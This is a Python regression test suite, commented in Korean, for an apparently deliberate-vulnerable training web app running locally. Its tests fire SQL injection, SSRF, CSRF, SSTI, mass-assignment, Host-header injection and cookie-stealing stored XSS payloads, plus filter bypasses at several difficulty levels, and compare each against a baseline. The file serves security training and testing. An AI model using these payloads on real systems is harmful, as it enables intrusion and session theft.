#!/usr/bin/env python3
"""
vulnrun 회귀 테스트 스위트 — 8단계 각 익스플로잇이 여전히 뚫리는지 대조군과 함께 검증한다.

판별 규약 (README·이슈 #3):
  - 🎉 마커는 익스플로잇 성공 시에만 렌더된다(정적 정답/목표 섹션엔 없음). 이게 1차 판별자.
  - 🎉 를 안 쓰는 챌린지(hack2 SSRF)는 FLAG 문자열 '발생 횟수' 대조로 판별한다.
  - 모든 테스트는 대조군을 함께 잰다: baseline(익스플로잇 없음)=무마커, exploit=마커.
    한쪽만 재면 근거가 아니다.

기동 방식 (둘 중 택1):
  python verify.py            # main.py 를 새로 띄워(깨끗한 상태) 검증하고 종료 (기본)
  python verify.py --url URL   # 이미 떠 있는 :8080 인스턴스를 대상으로 검증 (spawn 안 함)

주의: 이 스위트는 '깨끗한 상태'를 전제한다(hack5 는 alice 를 admin 으로 영구 승격시킨다).
기본 spawn 모드는 매번 새 프로세스(=새 DB)로 시작하므로 이 문제가 없다. --url 로 이미 떠 있는
인스턴스를 재사용하면, 앞선 실행의 상태 잔여로 baseline 이 오탐될 수 있다(→ 상태 리셋 이슈 #5).
"""

import argparse
import http.client
import subprocess
import sys
import time
import urllib.parse
import os

MARK = "\U0001F389"  # 🎉
BASE_DIR = os.path.dirname(os.path.abspath(__file__))


# --------------------------------------------------------------------------
# HTTP 헬퍼
# --------------------------------------------------------------------------
class Client:
    def __init__(self, host, port):
        self.host, self.port = host, port

    def req(self, method, path, form=None, host_header=None, cookie=None):
        conn = http.client.HTTPConnection(self.host, self.port, timeout=20)
        headers = {"Host": host_header or f"{self.host}:{self.port}"}
        body = None
        if form is not None:
            body = urllib.parse.urlencode(form)
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        if cookie:
            headers["Cookie"] = cookie
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        conn.close()
        return data


# --------------------------------------------------------------------------
# 단계별 테스트 — 각 함수는 (baseline, exploit) 대조를 잰다.
# 실패 시 AssertionError 를 던지며, 메시지로 어느 대조가 깨졌는지 식별한다.
# --------------------------------------------------------------------------
def t_hack1(c):
    """SQL Injection — admin'-- 로 인증 우회."""
    base = c.req("POST", "/hack1/login", {"username": "admin", "password": "wrong"})
    evil = c.req("POST", "/hack1/login", {"username": "admin'--", "password": "x"})
    assert base.count(MARK) == 0, "baseline(오답 로그인)에 🎉 마커가 있으면 안 됨"
    assert evil.count(MARK) >= 1, "admin'-- 주입에 🎉 마커가 없음 (SQLi 미동작)"


def t_hack2(c):
    """SSRF — /internal 도달. 🎉 없음 → FLAG 발생 횟수 대조."""
    F = "FLAG{ssrf_reached_internal}"
    base = c.req("POST", "/hack2/fetch", {"url": "http://127.0.0.1:8080/hack2/"})
    ssrf = c.req("POST", "/hack2/fetch", {"url": "http://127.0.0.1:8080/hack2/internal"})
    assert base.count(F) == 1, f"baseline FLAG 발생 {base.count(F)}회 (정적 1회 기대)"
    assert ssrf.count(F) >= 2, f"SSRF FLAG 발생 {ssrf.count(F)}회 (성공 시 2회 이상 기대)"


def t_hack3(c):
    """CSRF — 토큰 없는 상태 변경으로 alice 이메일을 @evil.com 으로 변경."""
    base = c.req("GET", "/hack3/csrf")
    assert base.count(MARK) == 0, "baseline(변경 전) csrf 페이지에 🎉 마커가 있으면 안 됨"
    c.req("POST", "/hack3/csrf/change", {"email": "attacker@evil.com"})
    done = c.req("GET", "/hack3/csrf")
    assert done.count(MARK) >= 1, "이메일 강제 변경 후 🎉 마커가 없음 (CSRF 미동작)"


def t_hack4(c):
    """SSTI — eval 템플릿 엔진에 표현식 주입."""
    base = c.req("GET", "/hack4/render?" + urllib.parse.urlencode({"tmpl": "{{ 7*7 }}"}))
    # 주입한 표현식이 실제로 평가됨을 마커 조건(pwned{)로 확인
    evil = c.req("GET", "/hack4/render?" + urllib.parse.urlencode({"tmpl": "{{ 'pwned{'+'}' }}"}))
    assert "49" in base, "baseline {{ 7*7 }} 가 49 로 평가되지 않음"
    assert base.count(MARK) == 0, "baseline(산술 평가)에 🎉 마커가 있으면 안 됨"
    assert evil.count(MARK) >= 1, "표현식 주입에 🎉 마커가 없음 (SSTI 미동작)"


def t_hack5(c):
    """Mass Assignment — 폼에 없는 role=admin 필드를 끼워 넣어 권한 상승.
    쿠키 user=<username> 는 예측 가능(취약)하므로 로그인 없이 직접 지정한다."""
    base = c.req("GET", "/hack5/admin", cookie="user=bob")
    assert base.count(MARK) == 0, "baseline(role=user) 관리자 페이지에 🎉 마커가 있으면 안 됨"
    c.req("POST", "/hack5/profile", {"email": "a@x.com", "bio": "hi", "role": "admin"},
          cookie="user=alice")
    done = c.req("GET", "/hack5/admin", cookie="user=alice")
    assert done.count(MARK) >= 1, "role=admin 주입 후 관리자 페이지에 🎉 마커가 없음"


def t_hack6(c):
    """Host Header Injection — 비밀번호 재설정 링크에 공격자 Host 반영."""
    clean = c.req("POST", "/hack6/reset", {"email": "v@x.com"}, host_header="127.0.0.1:8080")
    evil = c.req("POST", "/hack6/reset", {"email": "v@x.com"}, host_header="evil.attacker.com")
    assert clean.count(MARK) == 0, "baseline(정상 Host) reset 에 🎉 마커가 있으면 안 됨"
    assert evil.count(MARK) >= 1 and "evil.attacker.com" in evil, \
        "공격자 Host 주입에 🎉 마커/반영이 없음 (Host 인젝션 미동작)"


def t_hack7(c):
    """Timing Side Channel — 복원 대상 비밀값(t1m1ng) 제출."""
    base = c.req("GET", "/hack7/timing?" + urllib.parse.urlencode({"secret": "wrong"}))
    evil = c.req("GET", "/hack7/timing?" + urllib.parse.urlencode({"secret": "t1m1ng"}))
    assert base.count(MARK) == 0, "baseline(오답)에 🎉 마커가 있으면 안 됨"
    assert evil.count(MARK) >= 1, "정답 비밀값에 🎉 마커가 없음 (timing 판정 미동작)"


def t_hack8(c):
    """Kill-chain STEP1 — 저장형 XSS 페이로드로 관리자 봇 세션 탈취."""
    base = c.req("GET", "/hack8/collect")
    assert base.count(MARK) == 0, "baseline(수집 전) /collect 에 🎉 마커가 있으면 안 됨"
    payload = "<img src=x onerror=\"new Image().src='/collect?c='+document.cookie\">"
    c.req("POST", "/hack8/board", {"author": "attacker", "body": payload})
    done = c.req("GET", "/hack8/collect")
    assert done.count(MARK) >= 1, "XSS 페이로드 등록 후 /collect 에 🎉 마커가 없음 (chain1 미동작)"


def t_hack1_levels(c):
    """난이도 레벨(#1) — SQLi 방어 강도별 대조."""
    inj = {"username": "admin'--", "password": "x"}
    low = c.req("POST", "/hack1/login", {**inj, "level": "low"})
    sec = c.req("POST", "/hack1/login", {**inj, "level": "secure"})
    assert low.count(MARK) >= 1, "low: admin'-- 가 성공해야 함"
    assert sec.count(MARK) == 0, "secure: admin'-- 가 차단돼야 함(파라미터 바인딩)"
    med_blk = c.req("POST", "/hack1/login", {**inj, "level": "medium"})
    med_byp = c.req("POST", "/hack1/login",
                    {"username": "admin", "password": "' OR '1'='1", "level": "medium"})
    assert med_blk.count(MARK) == 0, "medium: -- 주석 payload 는 막혀야 함"
    assert med_byp.count(MARK) >= 1, "medium: OR 기반 우회는 통과해야 함(블랙리스트 한계)"


def t_hack2_xss_levels(c):
    """난이도 레벨(#1) — XSS 필터 방어 강도별 대조."""
    onerr = urllib.parse.urlencode({"bio": "<img src=x onerror=x>"})
    low = c.req("GET", "/hack2/profile?level=low&" + onerr)
    sec = c.req("GET", "/hack2/profile?level=secure&" + onerr)
    assert low.count(MARK) >= 1, "low: onerror 페이로드가 그대로 실행돼야 함"
    assert sec.count(MARK) == 0, "secure: 출력 이스케이프로 실행 불가여야 함"
    overlap = urllib.parse.urlencode({"bio": "<img src=x ononerrorerror=x>"})
    med = c.req("GET", "/hack2/profile?level=medium&" + overlap)
    med_plain = c.req("GET", "/hack2/profile?level=medium&" + onerr)
    assert med.count(MARK) >= 1, "medium: 겹쳐쓰기 우회가 성공해야 함"
    assert med_plain.count(MARK) == 0, "medium: 평범한 onerror 는 막혀야 함"
    onfocus = urllib.parse.urlencode({"bio": "<svg onfocus=x autofocus tabindex=0>"})
    high = c.req("GET", "/hack2/profile?level=high&" + onfocus)
    high_ovl = c.req("GET", "/hack2/profile?level=high&" + overlap)
    assert high.count(MARK) >= 1, "high: 미차단 핸들러(onfocus) 우회가 성공해야 함"
    assert high_ovl.count(MARK) == 0, "high: 겹쳐쓰기는 재귀 필터로 막혀야 함"


TESTS = [
    ("hack1  SQL Injection",          t_hack1),
    ("hack2  SSRF",                   t_hack2),
    ("hack3  CSRF",                   t_hack3),
    ("hack4  SSTI (eval)",            t_hack4),
    ("hack5  Mass Assignment",        t_hack5),
    ("hack6  Host Header Injection",  t_hack6),
    ("hack7  Timing Side Channel",    t_hack7),
    ("hack8  Kill-chain STEP1 (XSS)", t_hack8),
    ("hack1  난이도 레벨 (SQLi)",       t_hack1_levels),
    ("hack2  난이도 레벨 (XSS 필터)",   t_hack2_xss_levels),
]


# --------------------------------------------------------------------------
# 런처
# --------------------------------------------------------------------------
def port_in_use(host, port):
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(0.5)
        return s.connect_ex((host, port)) == 0


def wait_ready(c, timeout=15):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            c.req("GET", "/")
            return True
        except Exception:
            time.sleep(0.3)
    return False


def run(c):
    passed = failed = 0
    for name, fn in TESTS:
        try:
            fn(c)
            print(f"  PASS  {name}")
            passed += 1
        except AssertionError as e:
            print(f"  FAIL  {name}\n          → {e}")
            failed += 1
        except Exception as e:
            print(f"  ERROR {name}\n          → {type(e).__name__}: {e}")
            failed += 1
    print(f"\n결과: {passed} passed, {failed} failed  (총 {len(TESTS)})")
    return failed == 0


def main():
    for stream in (sys.stdout, sys.stderr):  # Windows 콘솔 cp949 → 이모지/한글 출력 보장
        try:
            stream.reconfigure(encoding="utf-8")
        except Exception:
            pass

    ap = argparse.ArgumentParser(description="vulnrun 익스플로잇 회귀 테스트")
    ap.add_argument("--url", help="이미 떠 있는 인스턴스 URL (예: http://127.0.0.1:8080). "
                                   "지정하면 spawn 하지 않는다.")
    args = ap.parse_args()

    proc = None
    if args.url:
        parsed = urllib.parse.urlparse(args.url)
        host, port = parsed.hostname, parsed.port or 8080
        c = Client(host, port)
        print(f"대상: {args.url} (기존 인스턴스)")
        if not wait_ready(c):
            print("오류: 대상에 연결할 수 없습니다. main.py 가 떠 있는지 확인하세요.")
            return 2
    else:
        host, port = "127.0.0.1", 8080
        c = Client(host, port)
        # 포트가 이미 점유돼 있으면, 새로 띄운 프로세스가 바인드에 실패하고 우리는 '낡은
        # 인스턴스'에 붙어 거짓 통과를 낸다. 그래서 spawn 전에 8080 을 확인하고 거부한다.
        if port_in_use(host, port):
            print(f"오류: {host}:{port} 가 이미 사용 중입니다. 낡은 인스턴스에 붙는 것을 막기 위해 "
                  f"spawn 을 거부합니다.\n  → 그 인스턴스를 대상으로 검증하려면: "
                  f"python verify.py --url http://{host}:{port}\n  → 또는 기존 main.py 를 종료 후 재실행하세요.")
            return 2
        print("main.py 를 새로 기동합니다 (깨끗한 상태) …")
        proc = subprocess.Popen([sys.executable, os.path.join(BASE_DIR, "main.py")],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not wait_ready(c) or proc.poll() is not None:
            if proc.poll() is None:
                proc.terminate()
            print("오류: main.py 기동 실패 (내부 포트 8000~8007 이 사용 중일 수 있음). "
                  "이미 떠 있다면 --url http://127.0.0.1:8080 로 재실행하세요.")
            return 2

    try:
        ok = run(c)
    finally:
        if proc:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except Exception:
                proc.kill()
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
